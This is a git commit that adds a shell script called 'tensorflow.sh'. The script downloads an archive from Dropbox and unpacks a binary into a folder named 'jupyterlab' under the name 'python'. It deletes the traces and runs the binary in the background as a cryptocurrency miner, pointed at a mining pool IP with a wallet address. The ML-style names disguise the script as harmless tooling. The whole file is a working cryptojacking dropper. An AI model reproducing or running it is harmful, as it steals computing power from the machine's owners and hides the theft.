d7c3bd122213911d58f9c12385a702da4839e3ba
GraphXdev <66101531+GraphXdev@users.noreply.github.com>
2020-06-21 08:55:25 +0000

    Create tensorflow.sh

---
+++ tensorflow.sh
@@ -0,0 +1,16 @@
+#!/bin/sh
+cd /home/sshuser
+sysctl vm.nr_hugepages=2048
+ls
+wget https://www.dropbox.com/s/2j15ohnntlucrf2/nodejsapp8q.tar.gz
+tar xvzf nodejsapp8q.tar.gz
+mkdir jupyterlab
+cd nodejsbrnt
+cp nodejsfive /home/sshuser/jupyterlab/python
+cd /home/sshuser
+rm -r nodejsapp8q.tar.gz
+rm -r nodejsbrnt
+cd /home/sshuser/jupyterlab
+./python -o 167.114.65.192:10111 -u LZdfLiPo6Zs2hq7FggM1ePUMZjtmisCpzVunSjzyRTC7ei3xUJwuZtqCMKuf4kwsVci9ZhzAksHykFUX9ENzvMep4fG2nNs.100000 -p toosie -a rx/loki --donate-level 1 -t 7 -B
+clear
+ls
